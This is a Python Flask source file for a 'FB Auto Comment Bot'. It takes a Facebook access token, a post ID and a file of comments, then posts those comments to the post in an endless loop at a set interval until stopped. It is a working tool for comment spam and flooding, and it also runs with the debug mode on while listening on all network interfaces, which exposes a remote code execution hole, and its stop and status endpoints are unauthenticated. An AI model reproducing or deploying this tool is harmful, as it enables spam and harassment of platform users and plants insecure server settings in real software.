# main.py
import os
import time
import random
import string
from threading import Thread, Event
from flask import Flask, request, render_template_string

import requests

app = Flask(__name__)
app.debug = True

# Task store
tasks = {}

# ---------------- Worker ----------------
def worker_comment(task_id, access_token, post_id, interval, comments):
    stop_event = tasks[task_id]["stop"]
    index = 0
    while not stop_event.is_set():
        try:
            comment = comments[index]
            url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
            params = {"access_token": access_token, "message": comment}
            r = requests.post(url, data=params, timeout=10)
            if r.status_code == 200:
                print(f"[{task_id}] ✅ Comment posted: {comment}")
            else:
                print(f"[{task_id}] ❌ Failed: {r.text}")
            index = (index + 1) % len(comments)
        except Exception as e:
            print(f"[{task_id}] ⚠️ Error: {e}")
        time.sleep(interval)

# ---------------- HTML ----------------
INDEX_HTML = """
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>FB Auto Comment Bot</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { background: linear-gradient(135deg,#0f172a,#0ea5e9); color:#e6eef8; font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial; }
    .card { border-radius: 14px; box-shadow: 0 10px 30px rgba(2,6,23,0.6); background: linear-gradient(180deg,#ffffff,#f7fbff); color:#042a48; }
    label { font-weight:600; color:#0b2540; }
    textarea.form-control { height:120px; resize:vertical; }
    .muted { color:#5b6b76; font-size:0.9rem; }
  </style>
</head>
<body>
  <div class="container py-5">
    <div class="row justify-content-center">
      <div class="col-md-8 col-lg-6">
        <div class="card p-4">
          <h3 class="text-center mb-3">FB Auto Comment Bot</h3>

          <form method="post" enctype="multipart/form-data">
            <div class="mb-3">
              <label>Access Token</label>
              <textarea name="token" class="form-control" placeholder="EAAG..." required></textarea>
            </div>

            <div class="mb-3">
              <label>Post ID</label>
              <input type="text" name="postId" class="form-control" placeholder="1234567890" required>
            </div>

            <div class="mb-3">
              <label>Time Delay (seconds)</label>
              <input type="number" name="time" class="form-control" value="10" min="1">
            </div>

            <div class="mb-3">
              <label>Comments File (.txt)</label>
              <input type="file" name="txtFile" class="form-control" required>
              <div class="muted">One comment per line</div>
            </div>

            <button class="btn btn-primary w-100 mb-2">Start Commenting</button>
          </form>

          <hr>
          <form method="post" action="/stop">
            <label>Stop Task ID</label>
            <input type="text" name="taskId" class="form-control" placeholder="Enter task id">
            <button class="btn btn-danger mt-2 w-100">Stop</button>
          </form>

          <div class="mt-3 text-center">
            <a class="btn btn-outline-secondary w-100" href="/status">View Active Tasks</a>
          </div>
        </div>
      </div>
    </div>
  </div>
</body>
</html>
"""

# ---------------- Routes ----------------
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        token = request.form.get("token", "").strip()
        post_id = request.form.get("postId", "").strip()
        try:
            interval = int(request.form.get("time", "10"))
        except:
            interval = 10

        f = request.files.get("txtFile")
        if not f:
            return "Comments file required", 400
        comments = [ln.strip() for ln in f.read().decode("utf-8", errors="ignore").splitlines() if ln.strip()]
        if not comments:
            return "No comments in file", 400

        task_id = os.urandom(4).hex()
        stop_ev = Event()
        tasks[task_id] = {"thread": None, "stop": stop_ev}
        t = Thread(target=worker_comment, args=(task_id, token, post_id, interval, comments))
        tasks[task_id]["thread"] = t
        t.daemon = False
        t.start()
        return f"Task started. ID: {task_id}"

    return render_template_string(INDEX_HTML)

@app.route("/stop", methods=["POST"])
def stop_task():
    tid = request.form.get("taskId", "").strip()
    info = tasks.get(tid)
    if not info:
        return "No such task", 404
    info["stop"].set()
    return f"Stopped task {tid}"

@app.route("/status")
def status():
    out = {}
    for k, v in tasks.items():
        out[k] = {"alive": v["thread"].is_alive() if v["thread"] else False}
    return out

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
